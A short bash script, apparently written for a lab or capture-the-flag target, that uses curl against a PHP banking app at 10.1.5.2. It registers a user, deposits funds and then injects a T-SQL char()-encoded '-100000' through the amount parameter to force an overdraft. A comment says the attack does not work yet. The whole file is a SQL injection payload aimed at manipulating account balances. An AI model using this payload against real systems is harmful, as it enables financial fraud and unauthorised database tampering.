#!/bin/bash

#Does not work for now
#overdraft using T-SQL char() function, second order injection and a deposit, we create a new user, deposit X amount inside its account
#Then try to deposit -100 000 from his account

USER="MinUserPHP"
PASS="MinPassPHP"

#Create Account
curl -sS "10.1.5.2/process.php?user=$USER&pass=$PASS&drop=register" &
sleep 1

#Deposit X inside its account
curl -sS "10.1.5.2/process.php?user=$USER&pass=$PASS&drop=deposit&amount=100" &
sleep 1

#Try to deposit - 100 000
curl -sS "10.1.5.2/process.php?user=$USER&pass=$PASS&drop=deposit&amount=10'+char(45,49,48,48,48,48,48)+'" &
sleep 1

#Display Balance
curl -sS "10.1.5.2/process.php?user=$USER&pass=$PASS&drop=balance"
